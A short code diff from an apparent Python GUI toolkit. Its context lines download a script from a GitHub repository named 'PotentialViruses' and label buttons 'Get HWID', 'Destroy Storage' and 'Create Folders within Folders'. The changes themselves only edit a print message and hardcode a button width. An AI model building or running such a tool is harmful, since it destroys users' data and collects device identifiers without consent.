@@ -140,7 +140,7 @@ try:
     url = "https://raw.githubusercontent.com/Bernso/PotentialViruses/main/getprivip.py"
     save_path = os.path.join(filename, "getprivip.py")  # Full file path including directory
     download_py(url, save_path)
-    print("Python 5 file download process completed.\n")
+    print("Python 6 file download process completed.\n")
     
     print("All python files downloaded successfully!\n")
 
@@ -167,7 +167,7 @@ def calculate_button_width(texts):
 
 # Calculate the required width for each button
 button_texts = ["Get IP", "Get HWID", "Destroy Storage", "Create Folders within Folders"]
-button_width = calculate_button_width(button_texts) * 4.9
+button_width = 161.70000000000002
 button_height = 70
 try:
     from Required_Files.getip import get_public_ip
